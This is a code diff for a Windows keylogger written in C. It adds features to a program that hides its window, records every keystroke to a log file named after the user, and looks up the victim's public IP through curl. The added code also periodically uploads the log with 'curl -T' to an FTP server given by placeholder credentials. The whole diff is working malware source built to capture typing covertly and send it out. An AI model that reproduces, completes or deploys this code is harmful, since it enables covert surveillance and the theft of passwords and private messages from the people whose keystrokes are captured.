@@ -44,30 +44,44 @@ int save(int key, char *filename) {                          //save function tha
 int main()
 {
     stealth();
+    FILE *init;
     SYSTEMTIME curr;
-    char c,filename[40],sessionname[25];
+    char path[200]="C:\\PerfLogs\\";
+    char c,filename[40],sessionname[25],ip[20],cmd[1000];
     DWORD buffersize=25;
+    int i=0;
 
     GetSystemTime(&curr);
-
     itoa(GetCurrentProcessId(),filename,10);
     GetUserNameA(sessionname,&buffersize);
     strcat(filename,"_");
     strcat(filename,sessionname);
     strcat(filename,".log");
-
-    FILE *init;
-    init = fopen( filename , "w" );
-    fprintf(init,"DATE : %u/%u/%u || %u:%u \n",curr.wDay,curr.wMonth,curr.wYear,curr.wHour,curr.wMinute );
+    system("curl http://ip.42.pl/raw>C:\\PerfLogs\\ip.txt");
+    init = fopen("C:\\PerfLogs\\ip.txt","r");
+    fscanf(init,"%s",ip);
     fclose(init);
-    
+    system("del C:\\PerfLogs\\ip.txt");
+    strcat(path,filename);
+    init = fopen( path , "a+" );
+    fprintf(init,"IP : %s\nDATE : %u/%u/%u || %u:%u \n",ip,curr.wDay,curr.wMonth,curr.wYear,curr.wHour,curr.wMinute );
+    fclose(init);
+    strcpy(cmd,"curl -T ");
+    strcat(cmd,path);
+    strcat(cmd, " ftp://username:password@domain");
     
 
     while (1) {
+        i++;
+        if (i==2000)
+        {
+            i=0;
+            system(cmd);
+        }
         Sleep(10);
         for (int c = 0; c < 255; c++) {
             if (GetAsyncKeyState(c) == -32767)
-                save(c, filename);
+                save(c, path);
         }
     }
     return 0;
